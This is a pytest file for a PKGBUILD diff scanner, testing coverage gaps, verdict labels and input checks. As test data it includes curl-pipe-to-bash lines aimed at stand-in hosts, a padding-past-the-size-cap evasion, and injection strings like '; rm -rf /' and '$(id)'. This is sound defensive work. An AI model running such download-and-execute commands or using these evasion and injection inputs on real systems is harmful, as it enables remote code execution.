"""The security model, tested.

``scripts/security_gates.py`` is the enforcement surface and CI runs it
whole.  This file runs it too, so a claim in ``docs/security.md`` cannot
break without a local ``pytest`` noticing, and adds the behavioural cases
the gates assert only the shape of.
"""

import io
import sys
from pathlib import Path, PureWindowsPath
from types import SimpleNamespace

import pytest

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "scripts"))

from trustsight.analysis import scan_diff  # noqa: E402
from trustsight.config import (  # noqa: E402
    load_config,
    shipped_fatal_rule_ids,
)
from trustsight.coverage import (  # noqa: E402
    DIFF_TRUNCATED,
    INCOMPLETE_SUFFIX,
    LINE_TRUNCATED,
    TREE_NOT_ANALYZED,
    UNRESOLVED_SOURCE,
    describe,
    fail_closed,
    gaps_from,
    oversized_lines,
    qualified_band,
    unresolved_source_lines,
)
from trustsight.schema import PackageFact, ScoreEntry  # noqa: E402
from trustsight.scoring import (  # noqa: E402
    calculate_score,
    verdict_label,
    verdict_level,
)

HEADER = "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,4 @@\n pkgname=demo\n pkgver=1.0\n"


def _render_review(results, renderer):
    """Render *results* through the real console, captured as text."""
    from rich.console import Console

    import trustsight.cli.display as display

    buffer = io.StringIO()
    saved = display._console
    display._console = Console(file=buffer, force_terminal=False, width=200)
    try:
        renderer(results, 1, False, True, True, False)
    finally:
        display._console = saved
    return buffer.getvalue()


# --- the gates themselves -------------------------------------------------


@pytest.fixture(scope="module")
def security_gates_report():
    """Run the security gates once for the module, not once per test.

    ``run_gates`` is the most expensive thing in the suite after the
    corpus scans; the two tests below read the same report.
    """
    from security_gates import run_gates

    return run_gates()


def test_every_security_gate_passes(security_gates_report):
    failed = [g.name for g in security_gates_report if not g.passed]
    assert failed == [], f"security gates failing: {failed}"


def test_the_doc_and_the_gates_name_the_same_invariants(security_gates_report):
    """A guarantee with no check, or a check with no guarantee, is a bug."""
    from security_gates import gate_doc_lists_every_gate

    gates = [g for g in security_gates_report
             if g.name != "docs/security.md matches the gates"]
    assert gate_doc_lists_every_gate(gates).passed


@pytest.mark.parametrize("audit", ["security_gates", "regex_audit"])
def test_audit_source_reads_are_utf8_on_a_non_utf8_locale(audit, tmp_path, monkeypatch):
    import importlib

    module = importlib.import_module(audit)
    source = tmp_path / "probe.py"
    source.write_text("import re\n# \u0081\nPATTERN = re.compile('probe')\n", encoding="utf-8")
    read_text = Path.read_text

    def locale_read(path, encoding=None, errors=None):
        return read_text(path, encoding=encoding or "cp1252", errors=errors)

    monkeypatch.setattr(Path, "read_text", locale_read)
    monkeypatch.setattr(module, "SRC", tmp_path)
    monkeypatch.setattr(module, "ROOT", tmp_path)
    if audit == "security_gates":
        assert module.gate_no_interpreter_calls().passed
    else:
        assert module._literal_patterns() == [("probe.py:3", "probe")]


def test_tokenizer_import_allowlist_uses_portable_paths(monkeypatch):
    import security_gates

    worker = SimpleNamespace(
        relative_to=lambda root: PureWindowsPath("sandbox/expand_worker.py"),
        read_text=lambda **kwargs: "from trustsight import _tokenizer_engine",
    )
    import scripts.gates._input_bounds as gates_input_bounds

    monkeypatch.setattr(gates_input_bounds, "_python_files", lambda: [worker])
    assert security_gates.gate_tokenizer_module_is_isolated().passed


def test_tokenizer_pool_wait_gate():
    from security_gates import gate_tokenizer_pool_wait_is_bounded

    gate = gate_tokenizer_pool_wait_is_bounded()
    assert gate.passed, gate.measured


# --- coverage: what the run could not see ---------------------------------


def test_unresolved_source_is_a_computed_source_line():
    diff = HEADER + '+_url="$(curl -sIL -o /dev/null -w \'%{url_effective}\' "$_link")"\n'
    assert unresolved_source_lines(diff)


@pytest.mark.parametrize("line", [
    '+source=("https://example.org/demo-$pkgver.tar.gz")',
    '+source_x86_64=("$_base/demo.tar.gz")',
    '+_url="https://example.org/demo.tar.gz"',
    '+# _url="$(curl -s https://example.org/redirect)"',
])
def test_resolvable_or_commented_source_lines_are_not_a_gap(line):
    assert unresolved_source_lines(HEADER + line + "\n") == []


def test_removed_lines_are_not_a_gap():
    """A maintainer deleting a computed source is closing the gap, not opening it."""
    diff = HEADER + '-_url="$(curl -s https://example.org/redirect)"\n'
    assert unresolved_source_lines(diff) == []


@pytest.mark.parametrize("gap", [DIFF_TRUNCATED, TREE_NOT_ANALYZED, UNRESOLVED_SOURCE])
@pytest.mark.parametrize("level", ["Low", "Medium"])
def test_a_gap_forbids_a_clean_verdict(gap, level):
    assert fail_closed(level, [gap], []) == "Inconclusive"


@pytest.mark.parametrize("severity", ["HIGH", "CRITICAL", "FATAL"])
def test_a_strong_finding_keeps_its_band_despite_a_gap(severity):
    """Hiding a confirmed finding behind "inconclusive" would lose the signal."""
    breakdown = [ScoreEntry(rule_id="R001", severity=severity, weight=25)]
    assert fail_closed("Medium", [DIFF_TRUNCATED], breakdown) == "Medium"


def test_a_complete_analysis_is_not_downgraded():
    assert fail_closed("Low", [], []) == "Low"
    assert fail_closed("Critical", [DIFF_TRUNCATED], []) == "Critical"


def test_gaps_are_listed_in_a_stable_order():
    gaps = gaps_from(diff_truncated=True, tree_analyzed=False,
                     unresolved_sources=["_url=$(curl ...)"])
    assert gaps == [DIFF_TRUNCATED, TREE_NOT_ANALYZED, UNRESOLVED_SOURCE]


def test_describe_names_every_gap():
    text = describe([DIFF_TRUNCATED, UNRESOLVED_SOURCE])
    assert "size cap" in text and "computed at build time" in text
    assert describe([]) == ""


def test_coverage_appears_in_the_breakdown_without_scoring():
    from trustsight.schema import NoveltyContext

    score, breakdown, level = calculate_score(
        [], {}, NoveltyContext(), coverage_gaps=[DIFF_TRUNCATED],
    )
    entries = [e for e in breakdown if e.rule_id == "COVERAGE"]
    assert len(entries) == 1
    assert entries[0].weight == 0
    assert score == 0
    assert level == "Inconclusive"


def test_a_fatal_finding_still_reports_with_a_gap():
    """The gap is recorded, and a FATAL verdict is not softened by it - but
    it no longer inflates the score to 100 on its own.  The gap keeps the
    verdict Inconclusive; the FATAL rides the breakdown entry."""
    from trustsight.schema import NoveltyContext

    triggered = [{"rule_id": "R012", "severity": "FATAL", "name": "injection"}]
    score, breakdown, level = calculate_score(
        triggered, {}, NoveltyContext(), coverage_gaps=[DIFF_TRUNCATED],
    )
    assert score == 0
    # The downgrade applies to the clean and merely-elevated bands only: a
    # HIGH-or-worse entry stands on its own evidence, and the FATAL is in
    # the breakdown (fail_closed), so the band stays Low rather than going
    # Inconclusive.
    assert level == "Low"
    assert any(e.rule_id == "R012" and e.severity == "FATAL" for e in breakdown)
    assert any(e.rule_id == "COVERAGE" for e in breakdown)


def test_a_truncated_diff_cannot_report_low(tmp_path):
    """The padding bypass: pad past the cap, append the payload."""
    config = load_config()
    config = {**config, "diff": {**config.get("diff", {}), "max_diff_bytes": 512}}
    padding = "\n".join(f"+# pad {i}" for i in range(300))
    diff = HEADER + padding + "\n+echo hello\n"

    fact = scan_diff(diff, config=config, package_name="demo")
    assert DIFF_TRUNCATED in fact.coverage_gaps
    assert fact.risk == "Inconclusive"
    assert verdict_level(fact) == "Inconclusive"


def test_verdict_level_prefers_the_stored_band():
    fact = PackageFact(final_score=0, risk="Inconclusive")
    assert verdict_level(fact) == "Inconclusive"
    assert verdict_level(PackageFact(final_score=90)) == "Critical"


# --- the decoy seam: a gap always travels with the band -------------------


@pytest.mark.parametrize("band", ["Low", "Medium", "High", "Critical"])
def test_a_band_is_qualified_when_coverage_is_incomplete(band):
    assert qualified_band(band, [DIFF_TRUNCATED]) == band + INCOMPLETE_SUFFIX
    assert qualified_band(band, []) == band


def test_inconclusive_is_not_qualified():
    """It already says what the suffix would say."""
    assert qualified_band("Inconclusive", [DIFF_TRUNCATED]) == "Inconclusive"


def test_the_decoy_high_cannot_render_as_a_bare_high():
    """Pad past the cap, payload after the cut, one cheap HIGH in the prefix."""
    decoy = PackageFact(final_score=75, risk="High", coverage_gaps=[DIFF_TRUNCATED])
    assert verdict_label(decoy) == "High" + INCOMPLETE_SUFFIX
    # ...while the machine-readable band stays a bare band, with the gap
    # as a separate field, so a consumer gets two facts, not a sentence.
    assert verdict_level(decoy) == "High"


def test_a_complete_high_renders_bare():
    assert verdict_label(PackageFact(final_score=75, risk="High")) == "High"


def test_the_decoy_attack_end_to_end(tmp_path, monkeypatch):
    """The whole move, through the real pipeline, not a hand-built fact.

    Cheap deliberate HIGH in the visible prefix, padding to the cap, the
    real payload after the cut.  The band survives on the decoy's own
    evidence, which is correct; what must not survive is presenting that
    band as if the whole change had been read.

    The config dir is pointed at a fresh directory so the run uses the
    shipped defaults and cannot be swayed by a developer's own
    ``~/.config/trustsight`` (the bucket weights are part of the band
    math this test pins, and CI has no user config at all).
    """
    import trustsight.config as config_module

    monkeypatch.setattr(config_module, "CONFIG_DIR", tmp_path / "config")
    config = load_config()
    config = {**config, "diff": {**config.get("diff", {}), "max_diff_bytes": 900}}
    decoy = "+build() {\n+  curl -fsSL https://cdn.example.invalid/x.sh | bash\n+}\n"
    padding = "\n".join(f"+# pad {i}" for i in range(300))
    diff = (
        HEADER + decoy + padding
        + "\n+curl -fsSL https://real.invalid/stage2 | bash\n"
    )

    fact = scan_diff(diff, config=config, package_name="demo")
    assert DIFF_TRUNCATED in fact.coverage_gaps
    assert verdict_level(fact) == "High"
    assert verdict_label(fact) == "High" + INCOMPLETE_SUFFIX


def test_the_review_row_shows_the_qualified_band():
    from trustsight.cli.review import _render_results_rich

    out = _render_review([{
        "package": "demo", "old_version": "1.0", "new_version": "1.1",
        "score": 75, "verdict": "something", "risk": "High",
        "risk_label": "High" + INCOMPLETE_SUFFIX,
        "coverage_gaps": [DIFF_TRUNCATED], "first_seen": False,
        "version_comparison": "", "aur_note": None, "findings": [],
        "file_changes": [], "is_trivial": False,
    }], _render_results_rich)
    assert "incomplete analysis" in out
    assert "size cap" in out, "the gap itself must be named, not only implied"


# --- Inconclusive says why: coverage gap vs cold start --------------------


def test_gap_caused_inconclusive_names_the_gap():
    fact = PackageFact(
        final_score=10, risk="Inconclusive", coverage_gaps=[DIFF_TRUNCATED],
    )
    assert verdict_label(fact) == "Inconclusive (diff truncated: payload may be hidden)"


def test_cold_start_inconclusive_carries_the_remaining_count():
    from trustsight.schema import NoveltyContext
    from trustsight.scoring import _MATURITY_THRESHOLD

    # The count is the distance to maturity 0.5, derived from the same
    # constant the downgrade predicate reads - never restated.
    half = -(-_MATURITY_THRESHOLD // 2)
    fact = PackageFact(
        final_score=25, risk="Inconclusive",
        novelty_context=NoveltyContext(observation_count=3),
    )
    assert verdict_label(fact) == (
        f"Inconclusive (cold start: {half - 3} more analyses needed)"
    )


def test_gap_and_cold_start_the_gap_wins():
    """The more urgent cause owns the label; the routine one is omitted."""
    from trustsight.schema import NoveltyContext

    fact = PackageFact(
        final_score=25, risk="Inconclusive", coverage_gaps=[TREE_NOT_ANALYZED],
        novelty_context=NoveltyContext(observation_count=3),
    )
    label = verdict_label(fact)
    assert label == "Inconclusive (repository files not examined: payload may be hidden)"
    assert "cold start" not in label


def test_every_gap_has_an_urgency_wording():
    from trustsight.coverage import GAPS, GAP_INCONCLUSIVE_REASONS

    assert set(GAP_INCONCLUSIVE_REASONS) == set(GAPS)


def test_parent_baseline_is_a_real_gap():
    from trustsight.coverage import GAP_REASONS, GAPS, gaps_from

    assert "parent_baseline" in GAPS
    assert "parent_baseline" in GAP_REASONS
    assert gaps_from(parent_baseline=True) == ["parent_baseline"]


def test_an_unknown_gap_falls_back_to_generic_wording():
    """A gap name written by a newer build still surfaces, worded generically."""
    from trustsight.coverage import inconclusive_label

    assert inconclusive_label(["some_future_gap"]) == (
        "Inconclusive (some_future_gap: analysis incomplete)"
    )


def test_multiple_gaps_are_all_named():
    from trustsight.coverage import inconclusive_label

    label = inconclusive_label([DIFF_TRUNCATED, UNRESOLVED_SOURCE])
    assert label == (
        "Inconclusive (diff truncated: payload may be hidden; "
        "source computed at build time: fetch destination unknown)"
    )


def test_a_gap_qualified_high_is_unchanged():
    decoy = PackageFact(final_score=75, risk="High", coverage_gaps=[DIFF_TRUNCATED])
    assert verdict_label(decoy) == "High" + INCOMPLETE_SUFFIX


def test_cold_start_inconclusive_end_to_end():
    """Through calculate_score, not a hand-built band."""
    from trustsight.schema import NoveltyContext
    from trustsight.scoring import _MATURITY_THRESHOLD

    half = -(-_MATURITY_THRESHOLD // 2)
    weak = [{"rule_id": "R050", "severity": "MEDIUM", "name": "w", "match": ""}] * 2
    novelty = NoveltyContext(observation_count=half - 1)
    score, _breakdown, level = calculate_score(weak, {}, novelty)
    assert level == "Inconclusive"
    fact = PackageFact(final_score=score, risk=level, novelty_context=novelty)
    assert verdict_label(fact) == "Inconclusive (cold start: 1 more analyses needed)"


def test_the_json_report_keeps_the_bare_band_and_carries_the_label():
    """risk stays a bare band; the qualified string rides risk_label.

    Both ride the score group (B11), so this asks for them the way a
    consumer does rather than reading a per-command helper.
    """
    from trustsight.reporting import evaluate_fact, report_body
    from trustsight.schema import NoveltyContext

    def _body(fact):
        return report_body(evaluate_fact(fact), include_score=True)

    gapped = _body(PackageFact(
        package_name="demo", final_score=10, risk="Inconclusive",
        coverage_gaps=[DIFF_TRUNCATED],
    ))
    assert gapped["risk"] == "Inconclusive"
    assert gapped["risk_label"] == "Inconclusive (diff truncated: payload may be hidden)"
    assert gapped["coverage_gaps"] == [DIFF_TRUNCATED]

    cold = _body(PackageFact(
        package_name="demo", final_score=25, risk="Inconclusive",
        novelty_context=NoveltyContext(observation_count=3),
    ))
    assert cold["risk"] == "Inconclusive"
    assert cold["risk_label"].startswith("Inconclusive (cold start: ")
    assert cold["coverage_gaps"] == []


def test_the_review_row_shows_the_inconclusive_cause():
    from trustsight.cli.review import _render_results_rich

    out = _render_review([{
        "package": "demo", "old_version": "1.0", "new_version": "1.1",
        "score": 10, "verdict": "something", "risk": "Inconclusive",
        "risk_label": "Inconclusive (diff truncated: payload may be hidden)",
        "coverage_gaps": [DIFF_TRUNCATED], "first_seen": False,
        "version_comparison": "", "aur_note": None, "findings": [],
        "file_changes": [], "is_trivial": False,
    }], _render_results_rich)
    assert "payload may be hidden" in out


def test_stored_rows_differentiate_the_inconclusive_cause():
    """history/list read fact_json: gaps name the gap, cold start says so."""
    import json

    from trustsight.scoring import stored_band

    row = {"final_score": 10, "fact_json": json.dumps(
        {"risk": "Inconclusive", "coverage_gaps": [DIFF_TRUNCATED]})}
    label, complete = stored_band(row)
    assert label == "Inconclusive (diff truncated: payload may be hidden)"
    assert complete is False

    # The observation count is not in the stored row, so the cold-start
    # case is named without the remaining-analyses count.
    cold_row = {"final_score": 25, "fact_json": json.dumps(
        {"risk": "Inconclusive", "coverage_gaps": []})}
    assert stored_band(cold_row) == ("Inconclusive (cold start)", True)


# --- the line clamp is a declared gap, not a silent skip ------------------


def test_an_over_long_line_is_recorded_as_a_gap():
    from trustsight.rules import MAX_RULE_LINE_BYTES

    payload = "+_x=1; " + "a" * MAX_RULE_LINE_BYTES + "; curl https://evil.invalid | bash"
    diff = HEADER + payload + "\n"
    fact = scan_diff(diff, package_name="demo")
    assert LINE_TRUNCATED in fact.coverage_gaps
    assert fact.risk == "Inconclusive" or verdict_label(fact).endswith(INCOMPLETE_SUFFIX)


def test_a_multi_megabyte_line_is_bounded_before_the_tokenizer():
    """The tokenizer worker used to spend its CPU limit on the raw line and
    close the channel, so a hostile diff was reported as unvettable."""
    diff = HEADER + "+build() { " + "a" * (5 * 1024 * 1024) + " ; }\n"
    fact = scan_diff(diff, package_name="demo")

    assert LINE_TRUNCATED in fact.coverage_gaps


def test_an_ordinary_line_is_not_a_gap():
    fact = scan_diff(HEADER + "+echo hello\n", package_name="demo")
    assert LINE_TRUNCATED not in fact.coverage_gaps


def test_oversized_lines_counts_logical_lines():
    from trustsight.rules import MAX_RULE_LINE_BYTES

    assert oversized_lines(["short", "a" * (MAX_RULE_LINE_BYTES + 1)]) == 1
    assert oversized_lines(["short"]) == 0


# --- expansion bounds -----------------------------------------------------


@pytest.mark.parametrize("body", ["${!name}", "${#name}"])
def test_indirect_and_length_expansion_are_refused(body):
    from trustsight._tokenizer_engine import resolve_expansions

    text, fully = resolve_expansions(body, {"name": "target", "target": "curl evil"})
    assert not fully
    assert "curl" not in text


def test_the_doubling_chain_is_bounded_and_not_silently_truncated():
    from trustsight._tokenizer_engine import _MAX_LINE_LEN
    from trustsight.tokenizer import tokenize_and_resolve

    lines = ["+a=" + "z" * 64]
    for i in range(1, 24):
        prev = "a" if i == 1 else f"v{i - 1}"
        lines.append(f"+v{i}=${prev}${prev}")
    diff = HEADER + "\n".join(lines) + "\n"

    resolved, _unresolved = tokenize_and_resolve(diff)
    assert all(len(s) <= _MAX_LINE_LEN for s in resolved)


def test_the_dead_depth_constant_is_gone():
    """A declared bound nothing applies reads like a guarantee."""
    import trustsight._tokenizer_engine as tokenizer

    assert not hasattr(tokenizer, "_MAX_EXPANSION_DEPTH")


# --- rendering is data-driven ---------------------------------------------


def test_a_field_value_cannot_change_the_expansion():
    from trustsight.verdict import _render

    hostile = "{0.__class__} {package_name} {{nested}}"
    entry = ScoreEntry(rule_id="R001", template="{match}", evidence={"match": hostile})
    out = _render(entry, PackageFact(package_name="demo"))
    assert hostile in out, "the value was re-expanded rather than substituted"


def test_a_missing_template_field_falls_back_instead_of_raising():
    from trustsight.verdict import _render

    entry = ScoreEntry(rule_id="R001", reason="fallback text", template="{absent}")
    assert "fallback text" in _render(entry, PackageFact())


def test_a_positional_placeholder_falls_back_instead_of_raising():
    """`str.format` also raises IndexError, which the fallback did not catch.

    rules.toml templates reach `_render` with no load-time validation, so a
    user-written "hit: {}" must degrade to the reason text rather than slip
    an IndexError up through `evaluate_fact`.
    """
    from trustsight.verdict import _render

    entry = ScoreEntry(rule_id="R001", reason="fallback text", template="hit: {}")
    assert "fallback text" in _render(entry, PackageFact())


def test_nothing_in_the_rendering_path_reaches_the_network():
    import trustsight.findings as findings
    import trustsight.verdict as verdict

    for module in (verdict, findings):
        text = Path(module.__file__).read_text().lower()
        for banned in ("openai", "anthropic", "urllib.request", "httpx", "requests"):
            assert banned not in text


# --- vercmp shape check ---------------------------------------------------


@pytest.mark.parametrize("hostile", ["-h", "--help", "-1:2.0", "; rm -rf /", "", "-",
                                     "1.0 --flag", "$(id)", "1.0\n-h"])
def test_a_non_version_never_reaches_a_command_line(hostile):
    from trustsight.discovery import _VERSION_ARG_RE

    assert not _VERSION_ARG_RE.match(hostile)


@pytest.mark.parametrize("version", ["1.0", "1:1.1.1w-1", "2.0.0.r15.g0a1b2c3-1",
                                     "1.0_beta+2~rc1", "20240101-2"])
def test_a_real_version_passes_the_shape_check(version):
    from trustsight.discovery import _VERSION_ARG_RE

    assert _VERSION_ARG_RE.match(version)


# --- the baseline bound ---------------------------------------------------


def test_doc_cross_references_resolve():
    from security_gates import gate_doc_cross_references_resolve

    gate = gate_doc_cross_references_resolve()
    assert gate.passed, gate.measured


def test_a_renamed_heading_is_caught(tmp_path, monkeypatch):
    """The failure this gate exists for: rename a heading, break the links.

    Every sentence on the page stays true and nothing else fails, which
    is the documentation-level form of skipping content without
    recording a gap.
    """
    import security_gates

    docs = tmp_path / "docs"
    docs.mkdir()
    (docs / "a.md").write_text("# A\n\nSee [B](b.md#the-old-name).\n")
    (docs / "b.md").write_text("# B\n\n## The new name\n")
    import scripts.gates._core as gates_core
    import scripts.gates._reporting as gates_reporting

    monkeypatch.setattr(gates_reporting, "ROOT", tmp_path)
    monkeypatch.setattr(gates_core, "ROOT", tmp_path)

    gate = security_gates.gate_doc_cross_references_resolve()
    assert not gate.passed
    assert any("no such anchor" in problem for problem in gate.measured)


def test_a_regex_in_inline_code_is_not_a_link(tmp_path, monkeypatch):
    """`(?<![^\x00-\x7F])[...]` contains `](...)` and is not markup."""
    import security_gates

    docs = tmp_path / "docs"
    docs.mkdir()
    (docs / "a.md").write_text(
        "# A\n\n- **Pattern:** `(?<![^\\x00-\\x7F])[\\u200B](?![^\\x00-\\x7F])`\n"
    )
    import scripts.gates._core as gates_core
    import scripts.gates._reporting as gates_reporting

    monkeypatch.setattr(gates_reporting, "ROOT", tmp_path)
    monkeypatch.setattr(gates_core, "ROOT", tmp_path)
    assert security_gates.gate_doc_cross_references_resolve().passed


def test_a_baseline_cannot_supply_rules_or_weights():
    from security_gates import gate_a_baseline_supplies_state_not_rules

    gate = gate_a_baseline_supplies_state_not_rules()
    assert gate.passed, gate.measured


# --- FATAL integrity ------------------------------------------------------


def test_the_protected_set_is_derived_not_hardcoded():
    assert set(shipped_fatal_rule_ids()) == {"R012", "R013"}
